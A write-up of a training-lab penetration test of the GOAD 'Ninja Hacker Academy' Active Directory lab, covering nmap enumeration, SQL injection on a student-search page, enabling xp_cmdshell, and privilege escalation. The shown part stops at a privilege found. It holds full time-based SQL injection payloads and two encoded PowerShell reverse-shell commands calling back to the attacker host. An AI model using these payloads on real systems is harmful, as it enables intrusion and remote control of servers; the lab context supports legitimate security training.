---
layout: default
title : nighthawk - GOAD - NHA Ninja Hacking Academy (NHA)
---

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/731a0bed-774d-4103-a4c8-b41d30fc78c5" />

### Description
This lab is written as a training challenge where GOAD was written as a lab with a maximum of vulns. We will look on how to exploit many vulnerabilities as possible to get DA on both domains, 6 flags (web, sql_low, sql_high, share, dc_academy, dc_final).
<br></br>

### Enumeration
<br>

- First get list of ip

```
192.168.56.10
192.168.56.20
192.168.56.21 <--- (STARTING POINT)
192.168.56.22
192.168.56.23
```
<br></br>

#### 192.168.56.21 (Entry Point)

- Enumerating machines with nmap

```shell
# Nmap 7.95 scan initiated Thu Aug 20 06:46:26 2026 as: /usr/lib/nmap/nmap --privileged -F -sCV -oN GOADNHA.21_fastscan.txt -v -Pn 192.168.56.21
Nmap scan report for web.academy.ninja.lan (192.168.56.21)
Host is up (0.00035s latency).
Not shown: 96 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Home Page - NHA - Ninja Hacker Academy
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 4859E39AE6C0F1F428F2126A6BB32BD9
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ACADEMY
|   NetBIOS_Domain_Name: ACADEMY
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: academy.ninja.lan
|   DNS_Computer_Name: web.academy.ninja.lan
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-20T05:39:44+00:00
| ssl-cert: Subject: commonName=web.academy.ninja.lan
| Issuer: commonName=web.academy.ninja.lan
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-18T21:08:18
| Not valid after:  2027-02-17T21:08:18
| MD5:   a27d:4630:6cdc:748b:7ff3:4011:52b7:805c
|_SHA-1: 308f:964a:4583:7c45:f28b:0ad6:faaa:e873:212b:c0b8
|_ssl-date: 2026-08-20T05:40:29+00:00; -6m45s from scanner time.
MAC Address: 08:00:27:1B:9D:25 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-20T05:39:45
|_  start_date: N/A
|_clock-skew: mean: -6m48s, deviation: 2s, median: -6m50s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 06:47:14 2026 -- 1 IP address (1 host up) scanned in 48.13 seconds
```
we have http open on port 80, let's check out what's going on 
<br></br>

<img width="1411" height="924" alt="image" src="https://github.com/user-attachments/assets/a13dd6d3-f2c4-49f5-9f5a-a840fede8463" />

cool we got a Ninja Hacking Academy home page. 
<br></br>

<img width="1385" height="763" alt="image" src="https://github.com/user-attachments/assets/509cc5be-16a7-4f86-8787-a63959d7c5f7" />
checking around the web application, found list of students.

<img width="1808" height="517" alt="image" src="https://github.com/user-attachments/assets/ce631179-c074-4f46-8385-407b92ab12d6" />

searching by firstname, `s`. we got a juicy url which is a potential ground to test for sql injection
<br></br>

- Testing for sql injection

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]                                                                      
└─$ ghauri -u 'http://192.168.56.21/Students?SearchString=s&orderBy=Firstname' --dbs 
```

<img width="1087" height="620" alt="image" src="https://github.com/user-attachments/assets/d3960ea7-922d-4091-b8c6-147b0f336596" />

using an offsec tool `ghauri`  we can see the database available. which proves there's sql injection vulnerability present.
<br></br>


- Manually testing for SQL injecction

<img width="1924" height="1033" alt="image" src="https://github.com/user-attachments/assets/72e6d391-6a07-4ccc-8fe8-75e46b82d3d9" />

using payload `WAITFOR DELAY '00:00:10'--+-` on url `http://192.168.56.21/Students?SearchString=s&orderBy=Firstname%20WAITFOR%20DELAY%20%2700:00:10%27--+-` we delayed the web app for 10 secs. let's do 15 secs. 

<img width="1911" height="936" alt="image" src="https://github.com/user-attachments/assets/d7291642-1682-4b96-a69b-4014a76ba16c" />

We got the web app to delay loading for 15 secs. Now the juicy part, Poping Shell. 
<br></br>


#### Getting reverse shell into 192.168.56.21

> Injection payload to exec RCE

```sql
;EXEC%20sp_configure%20'show%20advanced%20options',%201;%20RECONFIGURE;--
;EXEC%20sp_configure%20'xp_cmdshell',%201;%20RECONFIGURE;--
;EXEC%20xp_cmdshell%20'ping%20192.168.56.1';--
```
send all the payloads 1 by 1 fire up tcpdump listener on your attacker ip 

<img width="951" height="264" alt="image" src="https://github.com/user-attachments/assets/ee943332-3d00-4810-b508-8adc5fb83d17" />

this confirmed we can execute commands and also interact with our attacker machine. now the juicy shelling part. 

- Fire up Ncat listener

<img width="550" height="164" alt="image" src="https://github.com/user-attachments/assets/690e1513-5f4a-405c-a502-2c3964169307" />

> Reverse shell payload 

```
;EXEC%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D';--
```

- send the payload 

<img width="1908" height="927" alt="image" src="https://github.com/user-attachments/assets/58381ce8-5a48-49bc-a6f0-eec667c9132d" />

- check listener

<img width="640" height="180" alt="image" src="https://github.com/user-attachments/assets/2548d04a-34b0-44f6-b947-44eeb08b0460" />

Our listener didn't catch shell. maybe there's a defense. 

- Let's look for another way 😹

```
;EXEC%20xp_cmdshell%20%27powershell%20-nop%20-w%20hidden%20-enc%20JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAnACwANAA0ADMAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAgADAAKQB7ADsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJAByAD0AaQBlAHgAIAAkAGQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwA7ACQAcgA9ACQAcgArACcAUABTAD4AIAAnADsAJABzAGIAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgBiACwAMAAsACQAcwBiAGIALgBMAGUAbgBnAHQAaAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA%3D%3D%27%3B--
```

<img width="3456" height="516" alt="image" src="https://github.com/user-attachments/assets/fadab247-5e6b-4cec-a755-4b69840bcaf0" />

Boom we got reverse shell as `nt authority\network service` but into 192.168.56.22 (SQL)
<br></br>

#### Privilege Escalation 

<img width="924" height="961" alt="image" src="https://github.com/user-attachments/assets/fe780ebe-811c-4ed5-9d47-34b7b63c9093" />

we found mssql admin password. 
<br></br>

- try out the cred

<img width="1443" height="136" alt="image" src="https://github.com/user-attachments/assets/19d13e94-3a2b-4cd6-964f-29ca0ea74e90" />

we have admin access on mssql 
<br></br>

- Connect the target machine to our smb server

<img width="779" height="128" alt="image" src="https://github.com/user-attachments/assets/ea1b645d-c414-4f3e-9bfa-ce04316554e8" />

host smbserver

<img width="1521" height="198" alt="image" src="https://github.com/user-attachments/assets/0b397106-0944-4c33-86b2-b89ffaf5e317" />

authenticated successfully with our smb server. 

<img width="1618" height="311" alt="image" src="https://github.com/user-attachments/assets/9a479960-6078-41b7-9258-6eebfd727ec0" />

we have privilege `SeImpersonate` enabled. there's heavy AV guard present. 












